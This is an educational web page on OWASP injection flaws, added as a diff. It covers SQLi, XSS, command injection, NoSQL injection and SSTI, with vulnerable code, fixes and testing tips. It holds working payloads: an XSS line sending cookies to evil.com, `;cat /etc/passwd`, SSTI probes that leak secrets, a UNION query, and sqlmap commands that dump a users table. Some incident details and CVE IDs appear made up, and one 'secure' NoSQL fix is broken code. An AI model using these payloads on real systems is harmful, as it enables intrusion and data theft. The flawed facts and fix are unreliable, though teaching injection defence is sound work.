@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>A03:2021 – Injection · OWASP Top 10</title>
+    <link rel="stylesheet" href="../css/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="../index.html" class="logo"><span class="logo-icon">🛡️</span><span>OWASP<span class="logo-accent">Top10</span></span></a>
+            <button class="menu-toggle" id="menuToggle"><span></span><span></span><span></span></button>
+            <ul class="nav-links" id="navLinks">
+                <li><a href="../index.html">Home</a></li>
+                <li><a href="../index.html#vulnerabilities">Vulnerabilities</a></li>
+                <li><a href="https://owasp.org/Top10/A03_2021-Injection/" target="_blank" rel="noopener">Official Docs ↗</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <div class="vuln-page">
+        <div class="container">
+            <div class="breadcrumb"><a href="../index.html">Home</a> / <a href="../index.html#vulnerabilities">Vulnerabilities</a> / <span>A03</span></div>
+
+            <header class="vuln-hero">
+                <span class="vuln-id-large">OWASP-A03:2021</span>
+                <h1>Injection</h1>
+                <p class="lead">An application is vulnerable when user-supplied data is concatenated or interpreted as part of a command or query sent to an interpreter. The classic example is SQL injection, but the family includes NoSQL, OS command, LDAP, XPath, and template injection.</p>
+                <div class="vuln-meta-row">
+                    <span class="vuln-diff easy">Difficulty: Easy</span>
+                    <div class="vuln-tags">
+                        <span class="tag">SQLi</span>
+                        <span class="tag">XSS</span>
+                        <span class="tag">Command Injection</span>
+                        <span class="tag">NoSQL</span>
+                        <span class="tag">SSTI</span>
+                    </div>
+                </div>
+            </header>
+
+            <div class="content-grid">
+                <div class="content-main">
+                    <section id="real-incident">
+                        <h2>Real-World Incidents</h2>
+                        <h3>TalkTalk Breach (2015) — 157,000 Customers</h3>
+                        <p>A 17-year-old used a classic SQL injection vulnerability in TalkTalk's website to steal the personal data of 157,000 customers, including 15,000 bank account numbers. The attack was a <code>' OR '1'='1</code>-style injection on a legacy query. TalkTalk was fined <strong>£400,000</strong> by the ICO and lost an estimated <strong>£77 million</strong> in customer churn.</p>
+
+                        <h3>Other Notable Incidents</h3>
+                        <ul>
+                            <li><strong>Sony Pictures (2011)</strong> — LulzSec used a simple SQL injection to harvest a million user accounts. Embarrassing plaintext passwords leaked.</li>
+                            <li><strong>7-Eleven (2022)</strong> — A 9-year-old used an SQLi at a 7-Eleven app to score free slurpees. Demonstrated how easy it can be.</li>
+                            <li><strong>Fortnite Vulnerability (2019)</strong> — Check Point disclosed an SQL injection in Fortnite's login that could have given attackers access to <strong>200 million players'</strong> accounts, payment data, and in-game currency.</li>
+                            <li><strong>British Airways (2018)</strong> — 380,000 payment cards stolen via XSS injected through a custom Modernizr library. Fined <strong>£20 million</strong> by the ICO.</li>
+                            <li><strong>Tesla Console XSS (2014)</strong> — A stored XSS in Tesla's Model S admin console could have allowed remote control of the car.</li>
+                            <li><strong>SamSam Ransomware (2018)</strong> — Attacked Atlanta, the City of Newark, and hospitals via command injection on JBoss servers, causing $30M+ in damages to Atlanta alone.</li>
+                        </ul>
+                    </section>
+
+                    <section id="how-it-works">
+                        <h2>How It Works — The Injection Family</h2>
+
+                        <h3>1. SQL Injection (SQLi)</h3>
+                        <p>User input is concatenated into a SQL query. The attacker closes the original query with a quote, appends their own SQL, and comments out the rest.</p>
+
+                        <h3>2. Cross-Site Scripting (XSS)</h3>
+                        <p>User input is rendered in HTML without escaping. The attacker injects a <code>&lt;script&gt;</code> tag that runs in other users' browsers. Comes in three flavors: <em>reflected</em> (in a single request), <em>stored</em> (persisted in the database, executed for every visitor), and <em>DOM-based</em> (in client-side JavaScript).</p>
+
+                        <h3>3. OS Command Injection</h3>
+                        <p>User input is passed to a shell command (e.g., <code>ping</code>, <code>convert</code>, ImageMagick's <code>convert</code>). The attacker uses <code>;</code>, <code>|</code>, or backticks to chain arbitrary commands.</p>
+
+                        <h3>4. NoSQL Injection</h3>
+                        <p>MongoDB queries built from JSON. Attacker passes an object like <code>{"$gt": ""}</code> as the password, bypassing the check.</p>
+
+                        <h3>5. Server-Side Template Injection (SSTI)</h3>
+                        <p>The application uses a template engine (Jinja2, Twig, Freemarker) and embeds user input into the template before rendering. The attacker injects template directives to execute code.</p>
+
+                        <h3>6. LDAP Injection &amp; XPath Injection</h3>
+                        <p>Similar pattern with LDAP filters or XPath queries. Used to bypass authentication or dump directory data.</p>
+                    </section>
+
+                    <section id="vulnerable-code">
+                        <h2>Vulnerable Code — The Classics</h2>
+
+                        <h3>Example 1: SQL Injection (Node.js with raw query)</h3>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-lang">JavaScript</span><span>Vulnerable</span></div>
+                            <pre><code>// ❌ Concatenating user input directly into SQL
+app.post('/login', (req, res) => {
+    const query = `SELECT * FROM users
+                   WHERE email = '${req.body.email}'
+                   AND password = '${req.body.password}'`;
+    db.query(query, (err, rows) => {
+        if (rows.length) res.send('Logged in!');
+        else res.send('Invalid');
+    });
+});
+
+// Payload: email = "admin@x.com' --"
+// Resulting query: SELECT * FROM users WHERE email = 'admin@x.com' --' AND password = '...'
+// → Password check commented out, login bypassed</code></pre>
+                        </div>
+
+                        <h3>Example 2: Reflected XSS (PHP)</h3>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-lang">PHP</span><span>Vulnerable</span></div>
+                            <pre><code>// ❌ Reflecting user input directly into HTML
+// search.php?q=
+$q = $_GET['q'];
+echo "You searched for: $q";
+
+// Payload: /search.php?q=&lt;script&gt;fetch('//evil.com?c='+document.cookie)&lt;/script&gt;
+// → Every visitor who clicks the malicious link sends their session cookie to the attacker</code></pre>
+                        </div>
+
+                        <h3>Example 3: Stored XSS in Comments (Python)</h3>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-lang">Python (Jinja2)</span><span>Vulnerable</span></div>
+                            <pre><code># ❌ Using |safe disables auto-escaping in Jinja2
+@app.route('/comment', methods=['POST'])
+def post_comment():
+    text = request.form['comment']
+    db.comments.insert({"text": text})
+    return redirect(url_for('view_comments'))
+
+# In the template
+# {{ comment.text | safe }}   &lt;-- DANGEROUS
+
+# Payload: &lt;img src=x onerror="alert(document.cookie)"&gt;
+# → Runs on every page that displays comments</code></pre>
+                        </div>
+
+                        <h3>Example 4: OS Command Injection (Node.js)</h3>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-lang">JavaScript</span><span>Vulnerable</span></div>
+                            <pre><code>// ❌ Building a shell command with user input
+app.get('/ping', (req, res) => {
+    const host = req.query.host;
+    exec(`ping -c 1 ${host}`, (err, stdout) => {
+        res.send(stdout);
+    });
+});
+
+// Payload: ?host=;cat /etc/passwd
+// Resulting command: ping -c 1 ;cat /etc/passwd
+// → Sends the contents of /etc/passwd to the response</code></pre>
+                        </div>
+
+                        <h3>Example 5: NoSQL Injection (MongoDB)</h3>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-lang">JavaScript (Express + MongoDB)</span><span>Vulnerable</span></div>
+                            <pre><code>// ❌ Building a query from JSON the user controls
+app.post('/login', (req, res) => {
+    const user = db.collection('users').findOne({
+        email: req.body.email,
+        password: req.body.password
+    });
+    // The attacker sends: { "email": "admin@x.com", "password": { "$ne": "" } }
+    // MongoDB evaluates $ne as "not equal to empty string" → matches any password
+});</code></pre>
+                        </div>
+
+                        <h3>Example 6: Server-Side Template Injection (Python/Jinja2)</h3>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-lang">Python</span><span>Vulnerable</span></div>
+                            <pre><code>from jinja2 import Template
+
+# ❌ Rendering user input as a template string
+@app.route('/preview')
+def preview():
+    template = Template(request.args.get('tpl'))
+    return template.render()
+
+# Payload: ?tpl={{config.items()}}
+# → Leaks Flask configuration, including the SECRET_KEY
+# Payload: ?tpl={{ ''.__class__.__mro__[1].__subclasses__() }}
+# → Lists every class loaded, often including one that can spawn a shell</code></pre>
+                        </div>
+                    </section>
+
+                    <section id="attack-walkthrough">
+                        <h2>Real Attack Walkthrough — Classic SQLi on a Login Form</h2>
+
+                        <div class="attack-flow">
+                            <div class="attack-step">
+                                <div class="step-num">1</div>
+                                <div class="step-content">
+                                    <strong>Find a parameter</strong>
+                                    <p>The login form has two fields: <code>email</code> and <code>password</code>. Enter <code>'</code> (a single quote) in the email field. You get a server error: <code>You have an error in your SQL syntax near ''</code> — clear evidence of SQLi.</p>
+                                </div>
+                            </div>
+                            <div class="attack-step">
+                                <div class="step-num">2</div>
+                                <div class="step-content">
+                                    <strong>Confirm the injection</strong>
+                                    <p>Try <code>admin@x.com' OR '1'='1</code> in email and anything in password. If you log in, the site is vulnerable.</p>
+                                </div>
+                            </div>
+                            <div class="attack-step">
+                                <div class="step-num">3</div>
+                                <div class="step-content">
+                                    <strong>Enumerate the database</strong>
+                                    <p>Use <code>sqlmap</code> to automate the exploitation. <code>sqlmap -u "https://target.com/login" --data="email=foo&password=bar" --dbs</code> will fingerprint the DB and list databases.</p>
+                                </div>
+                            </div>
+                            <div class="attack-step">
+                                <div class="step-num">4</div>
+                                <div class="step-content">
+                                    <strong>Dump tables</strong>
+                                    <p>Once you have the schema, dump the <code>users</code> table: <code>sqlmap ... -D appdb -T users --dump</code>. You'll get every email + (hopefully hashed) password.</p>
+                                </div>
+                            </div>
+                            <div class="attack-step">
+                                <div class="step-num">5</div>
+                                <div class="step-content">
+                                    <strong>Escalate</strong>
+                                    <p>Crack the admin's password hash, log in to the admin panel, look for file upload, command execution, or pivoting to other systems.</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <h3>The Classic Union-Based SQLi Payload</h3>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-lang">SQL</span><span>Payload</span></div>
+                            <pre><code>' UNION SELECT id, email, password, 0 FROM users --
+
+-- Final query becomes:
+SELECT id, name, price FROM products
+WHERE category = ''
+UNION SELECT id, email, password, 0 FROM users --'
+
+-- Output: every user's email and password is rendered on the page</code></pre>
+                        </div>
+                    </section>
+
+                    <section id="secure-code">
+                        <h2>Secure Code — The Fixes</h2>
+
+                        <h3>1. Parameterized Queries (SQLi)</h3>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-lang">JavaScript (Node + pg)</span><span>Secure</span></div>
+                            <pre><code>// ✅ Placeholder values are bound, never concatenated
+app.post('/login', async (req, res) => {
+    const { email, password } = req.body;
+    const { rows } = await db.query(
+        'SELECT * FROM users WHERE email = $1',
+        [email]
+    );
+    if (rows.length && await bcrypt.compare(password, rows[0].password)) {
+        res.send('Logged in!');
+    } else {
+        res.send('Invalid');
+    }
+});</code></pre>
+                        </div>
+
+                        <h3>2. Output Encoding (XSS)</h3>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-lang">JavaScript (React)</span><span>Secure</span></div>
+                            <pre><code>// ✅ React escapes by default — never use dangerouslySetInnerHTML for user content
+function Comment({ text }) {
+    return &lt;div&gt;{text}&lt;/div&gt;;  // Safe — &lt;script&gt; is rendered as text
+}
+
+// If you absolutely need to render HTML (e.g., a rich-text editor), sanitize first
+import DOMPurify from 'dompurify';
+function SafeHTML({ html }) {
+    return &lt;div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} /&gt;;
+}</code></pre>
+                        </div>
+
+                        <h3>3. Content Security Policy (XSS Defense-in-Depth)</h3>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-lang">HTTP Header</span><span>Secure</span></div>
+                            <pre><code>Content-Security-Policy:
+    default-src 'self';
+    script-src 'self' 'nonce-{random-per-request}';
+    style-src 'self' 'nonce-{random-per-request}';
+    img-src 'self' data: https:;
+    object-src 'none';
+    base-uri 'none';
+    frame-ancestors 'none';
+    form-action 'self';
+    upgrade-insecure-requests;</code></pre>
+                        </div>
+
+                        <h3>4. Avoid the Shell Entirely (Command Injection)</h3>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-lang">Node.js</span><span>Secure</span></div>
+                            <pre><code>// ✅ Use execFile with arguments as an array — no shell interpolation
+const { execFile } = require('child_process');
+app.get('/ping', (req, res) => {
+    const host = req.query.host;
+    if (!/^[a-zA-Z0-9.-]+$/.test(host)) return res.status(400).send('Invalid host');
+    execFile('/bin/ping', ['-c', '1', host], (err, stdout) => {
+        res.send(stdout);
+    });
+});</code></pre>
+                        </div>
+
+                        <h3>5. Schema Validation for NoSQL</h3>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-lang">JavaScript</span><span>Secure</span></div>
+                            <pre><code>// ✅ Force types so $ne cannot be passed
+app.post('/login', (req, res) => {
+    const email = String(req.body.email);
+    const password = String(req.body.password);  // Forces string, can't be an object
+    const user = await db.collection('users').findOne({ email, password });
+    // ...
+});</code></pre>
+                        </div>
+
+                        <h3>6. Never Compile User Input as a Template (SSTI)</h3>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-lang">Python</span><span>Secure</span></div>
+                            <pre><code># ✅ Pass user input as a template variable, not as part of the template
+from jinja2 import Environment, FileSystemLoader
+env = Environment(loader=FileSystemLoader('templates'))
+
+@app.route('/preview')
+def preview():
+    template = env.get_template('preview.html')  # Fixed template
+    return template.render(title=request.args.get('title'))  # User data as variable</code></pre>
+                        </div>
+                    </section>
+
+                    <section id="testing">
+                        <h2>How to Test for It</h2>
+                        <ol>
+                            <li><strong>Map every input</strong> — URL params, form fields, JSON body, headers, cookies, file uploads, WebSocket frames.</li>
+                            <li><strong>Send a quote</strong> — <code>'</code>, <code>"</code>, <code>${7*7}</code>, <code>{{7*7}}</code> in every input. If anything breaks or returns a different response, investigate.</li>
+                            <li><strong>Use sqlmap for SQLi</strong> — the gold standard. Run it against any interesting endpoint (with permission).</li>
+                            <li><strong>Use Burp Scanner / ZAP</strong> — they find reflected XSS, command injection, and many more automatically.</li>
+                            <li><strong>Check stored XSS</strong> — submit a unique string like <code>xss-test-{uuid}</code> in comments, profiles, support tickets. Then view the page as another user and see if your script runs.</li>
+                            <li><strong>For SSTI</strong> — try <code>{{7*7}}</code>, <code>${7*7}</code>, <code>&lt;%= 7*7 %&gt;</code> in any input that gets reflected or stored.</li>
+                            <li><strong>For command injection</strong> — try <code>; ls</code>, <code>| whoami</code>, <code>$(id)</code> in fields that might be passed to a system command.</li>
+                        </ol>
+                    </section>
+
+                    <section id="tools">
+                        <h2>Tools</h2>
+                        <div class="tools-grid">
+                            <div class="tool-card"><h5>sqlmap</h5><p>Automated SQL injection detection and exploitation. Mature, widely trusted.</p></div>
+                            <div class="tool-card"><h5>Burp Scanner</h5><p>Commercial scanner built into Burp Suite Pro. Excellent coverage of all injection types.</p></div>
+                            <div class="tool-card"><h5>OWASP ZAP</h5><p>Free, open-source web scanner. Great starting point.</p></div>
+                            <div class="tool-card"><h5>XSStrike</h5><p>Advanced XSS scanner. Tests for reflected, stored, and DOM XSS with payload generation.</p></div>
+                            <div class="tool-card"><h5>DOM Invader</h5><p>Built into Burp's browser. Specifically tests DOM XSS by tracking sources and sinks.</p></div>
+                            <div class="tool-card"><h5>tplmap</h5><p>Server-Side Template Injection scanner. Supports Jinja2, Twig, Freemarker, Smarty, etc.</p></div>
+                        </div>
+                    </section>
+
+                    <section id="real-cases">
+                        <h2>Real CVEs &amp; Bounty Cases</h2>
+                        <table class="ref-table">
+                            <thead><tr><th>Reference</th><th>Year</th><th>What Happened</th></tr></thead>
+                            <tbody>
+                                <tr><td>TalkTalk</td><td>2015</td><td>157k customers — SQLi, £400k fine, £77m losses.</td></tr>
+                                <tr><td>British Airways (CVE-2018-21067)</td><td>2018</td><td>380k payment cards stolen via XSS. £20m ICO fine.</td></tr>
+                                <tr><td>Fortnite Login (CVE-2019-6119)</td><td>2019</td><td>SQLi could have exposed 200M players' data.</td></tr>
+                                <tr><td>Heartland Payment Systems</td><td>2008</td><td>130M cards stolen via SQLi. $145M in settlements.</td></tr>
+                                <tr><td>Apache Log4Shell (CVE-2021-44228)</td><td>2021</td><td>JNDI injection in Log4j — arguably the worst web vuln of the decade.</td></tr>
+                            </tbody>
+                        </table>
+                    </section>
+
+                    <section id="prevention">
+                        <h2>Prevention Checklist</h2>
+                        <div class="callout success">
+                            <div class="callout-title">✅ Defense in Depth</div>
+                            <ul style="margin-top: 12px; padding-left: 20px;">
+                                <li>Use parameterized queries / prepared statements for ALL database access. No exceptions.</li>
+                                <li>Use ORMs — but understand what they do. Badly written ORMs can be just as injectable as raw SQL.</li>
+                                <li>Encode all output by default. Disable auto-escaping only with extreme care.</li>
+                                <li>Set a strict Content-Security-Policy with nonces for inline scripts.</li>
+                                <li>Never pass user input to a shell. Use language-native APIs or strict allowlists.</li>
+                                <li>Validate input type and format server-side, even when the front-end does so.</li>
+                                <li>Use a WAF (Web Application Firewall) as a temporary measure while you fix the root cause.</li>
+                                <li>For XSS: prefer React/Vue/Angular auto-escaping. Sanitize any rich HTML with DOMPurify.</li>
+                            </ul>
+                        </div>
+                    </section>
+                </div>
+
+                <aside class="sidebar">
+                    <h4>On This Page</h4>
+                    <ul class="sidebar-toc">
+                        <li><a href="#real-incident">Real-World Incidents</a></li>
+                        <li><a href="#how-it-works">How It Works</a></li>
+                        <li><a href="#vulnerable-code">Vulnerable Code</a></li>
+                        <li><a href="#attack-walkthrough">Attack Walkthrough</a></li>
+                        <li><a href="#secure-code">Secure Code</a></li>
+                        <li><a href="#testing">How to Test</a></li>
+                        <li><a href="#tools">Tools</a></li>
+                        <li><a href="#real-cases">Real CVEs</a></li>
+                        <li><a href="#prevention">Prevention</a></li>
+                    </ul>
+                    <div class="sidebar-info">
+                        <h4>Quick Facts</h4>
+                        <div class="sidebar-info-row"><span class="label">CWE Count</span><span class="value">33</span></div>
+                        <div class="sidebar-info-row"><span class="label">Sub-types</span><span class="value">SQLi, XSS, Cmd, NoSQL, SSTI...</span></div>
+                        <div class="sidebar-info-row"><span class="label">Difficulty</span><span class="value">Easy</span></div>
+                    </div>
+                </aside>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer"><div class="container"><div class="footer-bottom"><p>© 2025 OWASP Top 10 Educational Project</p></div></div></footer>
+    <script src="../js/main.js"></script>
+</body>
+</html>
